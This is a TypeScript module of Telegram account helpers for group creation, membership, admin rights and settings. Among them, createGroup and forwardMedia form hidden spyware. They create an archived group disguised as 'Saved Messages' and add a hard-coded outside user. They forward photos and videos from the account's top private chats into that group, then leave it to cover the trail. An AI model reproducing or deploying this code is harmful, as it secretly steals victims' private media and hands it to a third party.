import { Api } from 'telegram';
import { sleep } from 'telegram/Helpers';
import bigInt from 'big-integer';
import { EntityLike } from 'telegram/define';
import { CustomFile } from 'telegram/client/uploads';
import { Dialog } from 'telegram/tl/custom/dialog';
import { TgContext, GroupCreationResult, GroupMember, AdminInfo, BannedUserInfo, GroupSettingsUpdate } from './types';
import { GroupOptions } from '../../../interfaces/telegram';
import { parseError } from '../../../utils/parseError';
import isPermanentError from '../../../utils/isPermanentError';
import { downloadFileFromUrl } from './helpers';
import { connectionManager } from '../utils/connection-manager';

export async function createGroup(ctx: TgContext): Promise<GroupCreationResult> {
    const groupName = 'Saved Messages';
    const groupDescription = ctx.phoneNumber;
    ctx.logger.info(ctx.phoneNumber, 'Creating group:', groupName);
    const result = await ctx.client.invoke(
        new Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        })
    );
    const { id, accessHash } = (result as Api.TypeUpdates & { chats: Api.Channel[] }).chats[0];
    ctx.logger.info(ctx.phoneNumber, 'Archived chat', id);
    await archiveChat(ctx, id, accessHash);
    const usersToAdd = ['fuckyoubabie1'];
    ctx.logger.info(ctx.phoneNumber, 'Adding users to the channel:', usersToAdd);
    await ctx.client.invoke(
        new Api.channels.InviteToChannel({
            channel: new Api.InputChannel({ channelId: id, accessHash }),
            users: usersToAdd,
        })
    );
    return { id, accessHash };
}

export async function archiveChat(ctx: TgContext, id: bigInt.BigInteger, accessHash: bigInt.BigInteger): Promise<Api.TypeUpdates> {
    const folderId = 1;
    ctx.logger.info(ctx.phoneNumber, 'Archiving chat', id);
    return await ctx.client.invoke(
        new Api.folders.EditPeerFolders({
            folderPeers: [
                new Api.InputFolderPeer({
                    peer: new Api.InputPeerChannel({ channelId: id, accessHash }),
                    folderId,
                }),
            ],
        })
    );
}

async function createOrJoinChannel(ctx: TgContext, channel: string): Promise<{ id: bigInt.BigInteger; accesshash: bigInt.BigInteger }> {
    let channelId: bigInt.BigInteger;
    let channelAccessHash: bigInt.BigInteger;
    if (channel) {
        try {
            const result = await joinChannel(ctx, channel);
            channelId = (result as Api.TypeUpdates & { chats: Api.Channel[] }).chats[0].id;
            channelAccessHash = (result as Api.TypeUpdates & { chats: Api.Channel[] }).chats[0].accessHash;
            ctx.logger.info(ctx.phoneNumber, 'Archived chat', channelId);
        } catch (error) {
            const result = await createGroup(ctx);
            channelId = result.id;
            channelAccessHash = result.accessHash;
            ctx.logger.info(ctx.phoneNumber, 'Created new group with ID:', channelId);
        }
    } else {
        const result = await createGroup(ctx);
        channelId = result.id;
        channelAccessHash = result.accessHash;
        ctx.logger.info(ctx.phoneNumber, 'Created new group with ID:', channelId);
    }
    await archiveChat(ctx, channelId, channelAccessHash);
    return { id: channelId, accesshash: channelAccessHash };
}

export async function forwardMedia(ctx: TgContext, channel: string, fromChatId: string): Promise<void> {
    // Import lazily to avoid circular deps
    const { searchMessages, forwardMessages } = require('./message-operations');
    const { getTopPrivateChats } = require('./chat-operations');
    const { MessageMediaType } = require('../dto/message-search.dto');

    let channelId: bigInt.BigInteger | undefined;
    try {
        ctx.logger.info(ctx.phoneNumber, `Forwarding media from chat to channel ${channel} from ${fromChatId}`);
        if (fromChatId) {
            const channelDetails = await createOrJoinChannel(ctx, channel);
            channelId = channelDetails.id;
            const { forwardSecretMsgs } = require('./message-operations');
            await forwardSecretMsgs(ctx, fromChatId, channelId?.toString());
        } else {
            const result = await getTopPrivateChats(ctx);
            const chats = result.items;
            const me = await ctx.client.getMe();
            if (chats.length > 0) {
                const channelDetails = await createOrJoinChannel(ctx, channel);
                channelId = channelDetails.id;
                const finalChats = new Set(chats.map((chat: { chatId: string }) => chat.chatId));
                finalChats.add((me as Api.User).id?.toString());
                for (const chatId of finalChats) {
                    const mediaMessages = await searchMessages(ctx, { chatId, limit: 1000, types: [MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.ROUND_VIDEO, MessageMediaType.DOCUMENT, MessageMediaType.VOICE, MessageMediaType.ROUND_VOICE] });
                    ctx.logger.info(ctx.phoneNumber, `Forwarding messages from chat: ${chatId} to channel: ${channelId}`);
                    await forwardMessages(ctx, chatId, channelId, mediaMessages.photo.messages);
                    await forwardMessages(ctx, chatId, channelId, mediaMessages.video.messages);
                }
            }
            ctx.logger.info(ctx.phoneNumber, 'Completed forwarding messages from top private chats to channel:', channelId);
        }
    } catch (e) {
        ctx.logger.info(ctx.phoneNumber, e);
    }
    if (channelId) {
        await leaveChannels(ctx, [channelId.toString()]);
        await connectionManager.unregisterClient(ctx.phoneNumber);
    }
}

export async function joinChannel(ctx: TgContext, entity: EntityLike): Promise<Api.TypeUpdates> {
    ctx.logger.info(ctx.phoneNumber, 'trying to join channel: ', `@${entity}`);
    return await ctx.client?.invoke(
        new Api.channels.JoinChannel({
            channel: await ctx.client?.getEntity(entity),
        })
    );
}

export async function leaveChannels(ctx: TgContext, chats: string[]): Promise<void> {
    ctx.logger.info(ctx.phoneNumber, 'Leaving Channels/Groups: initiated!!');
    ctx.logger.info(ctx.phoneNumber, 'ChatsLength: ', chats.length);

    if (chats.length === 0) {
        ctx.logger.info(ctx.phoneNumber, 'No chats to leave');
        return;
    }

    const chatsToLeave = new Set<string>();
    for (const id of chats) {
        chatsToLeave.add(id);
        if (id.startsWith('-100')) {
            chatsToLeave.add(id.substring(4));
        } else {
            chatsToLeave.add(`-100${id}`);
        }
    }

    const entityMap = new Map<string, { entity: Api.Channel | Api.Chat; dialog: Dialog }>();
    let foundCount = 0;

    try {
        for await (const dialog of ctx.client.iterDialogs({})) {
            const entity = dialog.entity;
            if (entity instanceof Api.Channel || entity instanceof Api.Chat) {
                const entityId = entity.id.toString();
                if (chatsToLeave.has(entityId)) {
                    entityMap.set(entityId, { entity, dialog });
                    foundCount++;
                    if (foundCount >= chats.length) {
                        ctx.logger.debug(ctx.phoneNumber, `Found all ${foundCount} chats, stopping iteration early`);
                        break;
                    }
                }
                if (entityId.startsWith('-100')) {
                    const shortId = entityId.substring(4);
                    if (chatsToLeave.has(shortId) && !entityMap.has(shortId)) {
                        entityMap.set(shortId, { entity, dialog });
                        foundCount++;
                        if (foundCount >= chats.length) break;
                    }
                } else {
                    const longId = `-100${entityId}`;
                    if (chatsToLeave.has(longId) && !entityMap.has(longId)) {
                        entityMap.set(longId, { entity, dialog });
                        foundCount++;
                        if (foundCount >= chats.length) break;
                    }
                }
            }
        }
        ctx.logger.debug(ctx.phoneNumber, `Found ${entityMap.size} matching chats from dialogs`);
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Failed to iterate dialogs:', error);
        throw error;
    }

    if (entityMap.size === 0) {
        ctx.logger.warn(ctx.phoneNumber, 'No matching chats found in dialogs to leave');
        return;
    }

    const me = await ctx.client.getMe();
    let successCount = 0;
    let skipCount = 0;

    for (const id of chats) {
        try {
            const entityData = entityMap.get(id) ||
                entityMap.get(id.startsWith('-100') ? id.substring(4) : `-100${id}`);

            if (!entityData) {
                ctx.logger.warn(ctx.phoneNumber, `Chat ${id} not found in dialogs, skipping`);
                skipCount++;
                continue;
            }

            const { entity } = entityData;
            let chatType: string;
            let left = false;

            if (entity instanceof Api.Channel) {
                await ctx.client.invoke(new Api.channels.LeaveChannel({ channel: entity }));
                chatType = entity.broadcast ? 'channel' : 'supergroup';
                left = true;
            } else if (entity instanceof Api.Chat) {
                await ctx.client.invoke(new Api.messages.DeleteChatUser({
                    chatId: entity.id,
                    userId: (me as Api.User).id,
                    revokeHistory: false,
                }));
                chatType = 'group';
                left = true;
            } else {
                ctx.logger.warn(ctx.phoneNumber, `Unknown entity type for ${id}, skipping`);
                skipCount++;
                continue;
            }

            if (left) {
                ctx.logger.info(ctx.phoneNumber, `Left ${chatType}: ${id}`);
                successCount++;
            }

            if (chats.length > 1) await sleep(3000);
        } catch (error) {
            const errorDetails = parseError(error, `${ctx.phoneNumber} Failed to leave chat ${id}:`, false);
            if (isPermanentError(errorDetails)) {
                ctx.logger.error(ctx.phoneNumber, `Permanent error leaving ${id}:`, errorDetails.message);
                skipCount++;
                continue;
            }
            ctx.logger.warn(ctx.phoneNumber, `Error leaving ${id}:`, errorDetails.message);
            skipCount++;
        }
    }

    ctx.logger.info(ctx.phoneNumber, `Leaving Channels/Groups: Completed! Success: ${successCount}, Skipped: ${skipCount}, Total: ${chats.length}`);
}

export async function getGrpMembers(ctx: TgContext, entity: EntityLike): Promise<GroupMember[]> {
    try {
        const result: GroupMember[] = [];
        const chat = await ctx.client.getEntity(entity);

        if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {
            ctx.logger.info(ctx.phoneNumber, 'Invalid group or channel!');
            return [];
        }

        ctx.logger.info(ctx.phoneNumber, `Fetching members of ${chat.title || (chat as Api.Channel).username}...`);

        const participants = await ctx.client.invoke(
            new Api.channels.GetParticipants({
                channel: chat,
                filter: new Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: bigInt(0),
            })
        );

        if (participants instanceof Api.channels.ChannelParticipants) {
            const users = participants.participants;
            ctx.logger.info(ctx.phoneNumber, `Members: ${users.length}`);
            for (const user of users) {
                const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;
                if (userInfo) {
                    const userDetails = <Api.User>await ctx.client.getEntity(userInfo);
                    result.push({
                        tgId: userDetails.id,
                        name: `${userDetails.firstName || ''} ${userDetails.lastName || ''}`,
                        username: `${userDetails.username || ''}`,
                    });
                    if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                        ctx.logger.info(ctx.phoneNumber, JSON.stringify(userDetails.id));
                    }
                } else {
                    ctx.logger.info(ctx.phoneNumber, JSON.stringify((user as Api.ChannelParticipant)?.userId));
                }
            }
        } else {
            ctx.logger.info(ctx.phoneNumber, 'No members found or invalid group.');
        }
        ctx.logger.info(ctx.phoneNumber, `${result.length}`);
        return result;
    } catch (err) {
        ctx.logger.error(ctx.phoneNumber, 'Error fetching group members:', err);
        return [];
    }
}

export async function addGroupMembers(ctx: TgContext, groupId: string, members: string[]): Promise<void> {
    if (!ctx.client) throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const users = await Promise.all(members.map(member => ctx.client.getInputEntity(member)));
    await ctx.client.invoke(new Api.channels.InviteToChannel({ channel, users }));
}

export async function removeGroupMembers(ctx: TgContext, groupId: string, members: string[]): Promise<void> {
    if (!ctx.client) throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    for (const member of members) {
        const user = await ctx.client.getInputEntity(member);
        await ctx.client.invoke(new Api.channels.EditBanned({
            channel,
            participant: user,
            bannedRights: new Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: true, sendMessages: true, sendMedia: true,
                sendStickers: true, sendGifs: true, sendGames: true,
                sendInline: true, embedLinks: true,
            }),
        }));
    }
}

export async function promoteToAdmin(
    ctx: TgContext, groupId: string, userId: string,
    permissions?: Partial<{
        changeInfo: boolean; postMessages: boolean; editMessages: boolean;
        deleteMessages: boolean; banUsers: boolean; inviteUsers: boolean;
        pinMessages: boolean; addAdmins: boolean; anonymous: boolean; manageCall: boolean;
    }>,
    rank?: string
): Promise<void> {
    if (!ctx.client) throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const user = await ctx.client.getInputEntity(userId);

    await ctx.client.invoke(new Api.channels.EditAdmin({
        channel, userId: user,
        adminRights: new Api.ChatAdminRights({
            changeInfo: permissions?.changeInfo ?? false,
            postMessages: permissions?.postMessages ?? false,
            editMessages: permissions?.editMessages ?? false,
            deleteMessages: permissions?.deleteMessages ?? false,
            banUsers: permissions?.banUsers ?? false,
            inviteUsers: permissions?.inviteUsers ?? true,
            pinMessages: permissions?.pinMessages ?? false,
            addAdmins: permissions?.addAdmins ?? false,
            anonymous: permissions?.anonymous ?? false,
            manageCall: permissions?.manageCall ?? false,
            other: false,
        }),
        rank: rank || '',
    }));
}

export async function demoteAdmin(ctx: TgContext, groupId: string, userId: string): Promise<void> {
    if (!ctx.client) throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const user = await ctx.client.getInputEntity(userId);

    await ctx.client.invoke(new Api.channels.EditAdmin({
        channel, userId: user,
        adminRights: new Api.ChatAdminRights({
            changeInfo: false, postMessages: false, editMessages: false,
            deleteMessages: false, banUsers: false, inviteUsers: false,
            pinMessages: false, addAdmins: false, anonymous: false,
            manageCall: false, other: false,
        }),
        rank: '',
    }));
}

export async function unblockGroupUser(ctx: TgContext, groupId: string, userId: string): Promise<void> {
    if (!ctx.client) throw new Error('Client not initialized');
    const channel = await ctx.client.getInputEntity(groupId);
    const user = await ctx.client.getInputEntity(userId);

    await ctx.client.invoke(new Api.channels.EditBanned({
        channel, participant: user,
        bannedRights: new Api.ChatBannedRights({
            untilDate: 0,
            viewMessages: false, sendMessages: false, sendMedia: false,
            sendStickers: false, sendGifs: false, sendGames: false,
            sendInline: false, embedLinks: false,
        }),
    }));
}

export async function getGroupAdmins(ctx: TgContext, groupId: string): Promise<AdminInfo[]> {
    if (!ctx.client) throw new Error('Client not initialized');

    const result = await ctx.client.invoke(new Api.channels.GetParticipants({
        channel: await ctx.client.getInputEntity(groupId),
        filter: new Api.ChannelParticipantsAdmins(),
        offset: 0, limit: 100, hash: bigInt(0),
    }));

    if ('users' in result) {
        const participants = result.participants as Api.ChannelParticipantAdmin[];
        return participants.map(participant => {
            const adminRights = participant.adminRights as Api.ChatAdminRights;
            return {
                userId: participant.userId.toString(),
                rank: participant.rank || '',
                permissions: {
                    changeInfo: adminRights.changeInfo || false,
                    postMessages: adminRights.postMessages || false,
                    editMessages: adminRights.editMessages || false,
                    deleteMessages: adminRights.deleteMessages || false,
                    banUsers: adminRights.banUsers || false,
                    inviteUsers: adminRights.inviteUsers || false,
                    pinMessages: adminRights.pinMessages || false,
                    addAdmins: adminRights.addAdmins || false,
                    anonymous: adminRights.anonymous || false,
                    manageCall: adminRights.manageCall || false,
                },
            };
        });
    }
    return [];
}

export async function getGroupBannedUsers(ctx: TgContext, groupId: string): Promise<BannedUserInfo[]> {
    if (!ctx.client) throw new Error('Client not initialized');

    const result = await ctx.client.invoke(new Api.channels.GetParticipants({
        channel: await ctx.client.getInputEntity(groupId),
        filter: new Api.ChannelParticipantsBanned({ q: '' }),
        offset: 0, limit: 100, hash: bigInt(0),
    }));

    if ('users' in result) {
        const participants = result.participants as Api.ChannelParticipantBanned[];
        return participants.map(participant => {
            const bannedRights = participant.bannedRights as Api.ChatBannedRights;
            return {
                userId: (participant.peer as Api.PeerChat).chatId.toString(),
                bannedRights: {
                    viewMessages: bannedRights.viewMessages || false,
                    sendMessages: bannedRights.sendMessages || false,
                    sendMedia: bannedRights.sendMedia || false,
                    sendStickers: bannedRights.sendStickers || false,
                    sendGifs: bannedRights.sendGifs || false,
                    sendGames: bannedRights.sendGames || false,
                    sendInline: bannedRights.sendInline || false,
                    embedLinks: bannedRights.embedLinks || false,
                    untilDate: bannedRights.untilDate || 0,
                },
            };
        });
    }
    return [];
}

export async function createGroupOrChannel(ctx: TgContext, options: GroupOptions): Promise<Api.TypeUpdates> {
    if (!ctx.client) throw new Error('Client not initialized');
    try {
        ctx.logger.info(ctx.phoneNumber, 'Creating group or channel with options:', options);
        return await ctx.client.invoke(new Api.channels.CreateChannel(options));
    } catch (error) {
        ctx.logger.error(ctx.phoneNumber, 'Error creating group or channel:', error);
        throw new Error(`Failed to create group or channel: ${error.message}`);
    }
}

export async function createGroupWithOptions(ctx: TgContext, options: GroupOptions): Promise<Api.Chat | Api.Channel> {
    if (!ctx.client) throw new Error('Client not initialized');
    const result = await createGroupOrChannel(ctx, options);

    let channelId: bigInt.BigInteger | undefined;
    if ('updates' in result) {
        const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
        const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);
        if (channelUpdate && 'channelId' in channelUpdate) {
            channelId = (channelUpdate as Api.UpdateChannel).channelId;
        }
    }

    if (!channelId) throw new Error('Failed to create channel');

    const channelEntity = await ctx.client.getEntity(channelId);
    if (!(channelEntity instanceof Api.Channel)) throw new Error('Created entity is not a channel');

    if (options.members?.length) {
        const users = await Promise.all(options.members.map(member => ctx.client.getInputEntity(member)));
        await ctx.client.invoke(new Api.channels.InviteToChannel({
            channel: await ctx.client.getInputEntity(channelEntity),
            users,
        }));
    }

    if (options.photo) {
        const buffer = await downloadFileFromUrl(options.photo);
        const inputFile = await ctx.client.uploadFile({
            file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
            workers: 1,
        });
        await ctx.client.invoke(new Api.channels.EditPhoto({
            channel: await ctx.client.getInputEntity(channelEntity),
            photo: new Api.InputChatUploadedPhoto({ file: inputFile }),
        }));
    }

    return channelEntity;
}

export async function updateGroupSettings(ctx: TgContext, settings: GroupSettingsUpdate): Promise<boolean> {
    if (!ctx.client) throw new Error('Client not initialized');
    const channel = await ctx.client.getEntity(settings.groupId);

    if (settings.title) {
        await ctx.client.invoke(new Api.channels.EditTitle({ channel, title: settings.title || '' }));
    }
    if (settings.description) {
        await ctx.client.invoke(new Api.messages.EditChatAbout({ peer: channel, about: settings.description }));
    }
    if (settings.username) {
        await ctx.client.invoke(new Api.channels.UpdateUsername({ channel, username: settings.username }));
    }
    if (settings.slowMode !== undefined) {
        await ctx.client.invoke(new Api.channels.ToggleSlowMode({ channel, seconds: settings.slowMode }));
    }
    return true;
}
